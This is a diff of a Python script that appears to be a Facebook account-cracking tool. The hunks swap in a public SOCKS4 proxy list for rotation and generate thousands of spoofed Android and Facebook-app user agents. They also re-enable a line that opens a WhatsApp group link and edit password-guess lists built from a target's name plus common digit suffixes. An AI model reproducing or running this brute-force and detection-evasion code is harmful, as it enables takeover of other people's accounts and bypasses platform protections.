@@ -17,17 +17,17 @@ ualu,ualuh = [],[]
 
 ###----------[ GET PROXY ]----------###
 try:
-	proxylist= requests.get('https://github.com/hilboizz/socks/blob/main/indos4.txt').text
-	open('indos4.txt','w').write(proxylist)
+	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+	open('socksku.txt','w').write(proxylist)
 except Exception as e:
 	baz_anim(f'gagal ster :(')
-proxsi=open('indos4.txt','r').read().splitlines()
+proxsi=open('socksku.txt','r').read().splitlines()
 
 ###----------[ USER AGENT 1 ]----------###
 for agenku in range(10000):
 	a='Mozilla/5.0 (Linux; Android'
 	b=random.choice(['6','7','8','9','10','11','12'])
-	c='Redmi 4A Build/MMB29M; wv)'
+	c='PGEM10 Build/TP1A.220905.001; wv)'
 	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
 	e=random.randrange(80,103)
 	f='0'
@@ -77,28 +77,88 @@ for agenku in range(10000):
 for agenkuw in range(10000):
 	a='Mozilla/5.0 (Linux; Android'
 	b=random.choice(['8.1.0','9','10','11','12'])
-	c='CPH2109'
+	c='RMX3115 Build/SP1A.210812.016)'
 	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
 	e=random.randrange(83,103)
 	f='0'
 	g=random.randrange(4200,4900)
 	h=random.randrange(40,150)
-	i='Safari/537.36'
+	i='Mobile Safari/537.36 HeyTapBrowser/40.8.9.1'
 	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
 	usrgent2.append(uakuh)
 	
 	a='Mozilla/5.0 (Linux; Android'
 	b=random.choice(['8.1.0','9','10','11','12'])
-	c='CPH2089'
+	c='SUPER-ID M2101K6G)'
 	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
 	e=random.randrange(83,103)
 	f='0'
 	g=random.randrange(4200,4900)
 	h=random.randrange(40,150)
-	i='Safari/537.36'
+	i='Mobile Safari/537.36'
 	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
 	usrgent2.append(uakuh)
 	
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['8.1.0','9','10','11','12'])
+	c='SUPER-ID M2102J20SG)'
+	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	e=random.randrange(83,103)
+	f='0'
+	g=random.randrange(4200,4900)
+	h=random.randrange(40,150)
+	i='Mobile Safari/537.36'
+	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
+	usrgent2.append(uakuh)
+	
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['8.1.0','9','10','11','12'])
+	c='SUPER-ID DE2118)'
+	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	e=random.randrange(83,103)
+	f='0'
+	g=random.randrange(4200,4900)
+	h=random.randrange(40,150)
+	i='Mobile Safari/537.36'
+	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
+	usrgent2.append(uakuh)
+	
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['8.1.0','9','10','11','12'])
+	c='PHQ110 Build/RKQ1.211119.001; wv)'
+	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	e=random.randrange(83,103)
+	f='0'
+	g=random.randrange(4200,4900)
+	h=random.randrange(40,150)
+	i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]'
+	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
+	usrgent2.append(uakuh)
+	
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['8.1.0','9','10','11','12'])
+	c='RMX1921 Build/RKQ1.201217.002; wv)'
+	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.41'
+	e=random.randrange(83,103)
+	f='0'
+	g=random.randrange(4200,4900)
+	h=random.randrange(40,150)
+	i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/365.0.0.30.112;]'
+	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
+	usrgent2.append(uakuh)
+#Mozilla/5.0 (Linux; Android 11; RMX1921 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/365.0.0.30.112;]		
+	a='Mozilla/5.0 (Linux; Android '
+	b=random.choice(['8','9','10','11','12'])
+	c='SUPER-ID RMX3363)'
+	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	e=random.randrange(83,103)
+	f='0'
+	g=random.randrange(4200,4900)
+	h=random.randrange(40,150)
+	i='Mobile Safari/537.36 OPR/72.5.3767.69342'
+	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
+	usrgent2.append(uakuh)
+#Mozilla/5.0 (Linux; Android 11; RMX1921) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36 OPR/67.0.3508.63081
 ###----------[ PEWARNA ]----------###
 mer = '\033[1;31m'
 kun = '\033[1;33m'
@@ -222,7 +282,7 @@ def menu(id):
 		waktu(1)
 		login_men()
 	os.system('clear')
-	#os.system('xdg-open https://chat.whatsapp.com/Bk9n3OYSK0h8yc4oHgHkZN')
+	os.system('xdg-open https://chat.whatsapp.com/Bk9n3OYSK0h8yc4oHgHkZN')
 	waktu(1)
 	banner()
 	print(f'{xxx}─────────────────────────────')
@@ -361,15 +421,6 @@ def passwrdh():
 						pwv.append(frs+'1234')
 						pwv.append(frs+'12345')
 						pwv.append(frs+'123456')
-						pwv.append(frs+'54321')
-						pwv.append(frs+'01')
-						pwv.append(frs+'02')
-						pwv.append(frs+'03')
-						pwv.append(frs+'04')
-						pwv.append(frs+'05')
-						pwv.append(frs+'06')
-						pwv.append(frs+'07')
-						pwv.append(frs+'08')
 				else:
 					if len(frs)<3:
 						pwv.append(nmf)
@@ -379,16 +430,7 @@ def passwrdh():
 						pwv.append(frs+'123')
 						pwv.append(frs+'1234')
 						pwv.append(frs+'12345')
-						pwv.append(frs+'123456')		
-						pwv.append(frs+'54321')
-						pwv.append(frs+'01')
-						pwv.append(frs+'02')
-						pwv.append(frs+'03')
-						pwv.append(frs+'04')
-						pwv.append(frs+'05')
-						pwv.append(frs+'06')
-						pwv.append(frs+'07')
-						pwv.append(frs+'08')
+						pwv.append(frs+'123456')
 				if '><v><' in pwt:
 					for xpwn in pwn:
 						pwv.append(xpwn)
@@ -535,15 +577,6 @@ def passwrd():
 						pwv.append(frs+'1234')
 						pwv.append(frs+'12345')
 						pwv.append(frs+'123456')
-						pwv.append(frs+'54321')
-						pwv.append(frs+'01')
-						pwv.append(frs+'02')
-						pwv.append(frs+'03')
-						pwv.append(frs+'04')
-						pwv.append(frs+'05')
-						pwv.append(frs+'06')
-						pwv.append(frs+'07')
-						pwv.append(frs+'08')
 				else:
 					if len(frs)<3:
 						pwv.append(nmf)
@@ -554,15 +587,6 @@ def passwrd():
 						pwv.append(frs+'1234')
 						pwv.append(frs+'12345')
 						pwv.append(frs+'123456')
-						pwv.append(frs+'54321')
-						pwv.append(frs+'01')
-						pwv.append(frs+'02')
-						pwv.append(frs+'03')
-						pwv.append(frs+'04')
-						pwv.append(frs+'05')
-						pwv.append(frs+'06')
-						pwv.append(frs+'07')
-						pwv.append(frs+'08')
 				if '><v><' in pwt:
 					for xpwn in pwn:
 						pwv.append(xpwn)
